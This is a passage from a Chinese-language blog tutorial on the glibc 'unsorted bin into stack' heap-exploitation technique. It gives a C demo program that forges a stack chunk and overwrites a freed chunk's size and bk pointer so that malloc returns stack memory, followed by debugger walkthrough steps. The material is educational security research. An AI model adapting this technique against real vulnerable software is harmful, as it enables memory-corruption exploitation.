+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">  stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">  stack_buffer[<span class="number">3</span>] = (<span class="type">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointern&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_memn&quot;</span>);</span><br><span class="line">  victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now next malloc will return the region of our fake chunk: %pn&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x100): %pn&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">编译指令: gcc -g xxx.c   <span class="comment">//加-g动调的时候就可以依据代码逐行进行</span></span><br></pre></td></tr></table></figure>
+
+<p>首先是申请了两个chunk chunk0用来误导plmalloc chunk1用来防止chunk0和top chunk合并</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112257522.png" title="image-20230311225736485" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112257522.png" alt="image-20230311225736485"></a></p>
+<p>释放chunk0 进入unsortedbin</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112258579.png" title="image-20230311225827543" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112258579.png" alt="image-20230311225827543"></a></p>
+<p>伪造局部变量数组(也就是位于栈上的一块内存) 修改size域和bk域 bk域是为了迎合检查 双向链表的完整性</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112259815.png" title="image-20230311225931787" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112259815.png" alt="image-20230311225931787"></a></p>
+<p>修改chunk0的size域和bk域 误导plmalloc</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306093.png" title="image-20230311230601067" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306093.png" alt="image-20230311230601067"></a></p>
+<p>最后申请一个0x100大小的chunk 分配到的区域为栈上的数组<a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306954.png" title="image-20230311230656926" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306954.png" alt="image-20230311230656926"></a></p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112307511.png" title="image-20230311230747477" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112307511.png" alt="image-20230311230747477"></a></p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu16-04%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80"><span class="toc-number">2.</span> <span class="toc-text">ubuntu16.04泄露基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu-18-04%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80"><span class="toc-number">3.</span> <span class="toc-text">ubuntu 18.04泄露基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">4.</span> <span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-into-stack"><span class="toc-number">5.</span> <span class="toc-text">unsorted bin into stack</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/21/unsortedbinAttack/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/21/unsortedbinAttack/&text=unsortedbinAttack"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/21/unsortedbinAttack/&is_video=false&description=unsortedbinAttack"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unsortedbinAttack&body=Check out this article: http://example.com/2022/11/21/unsortedbinAttack/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/21/unsortedbinAttack/&name=unsortedbinAttack&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/21/unsortedbinAttack/&t=unsortedbinAttack"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
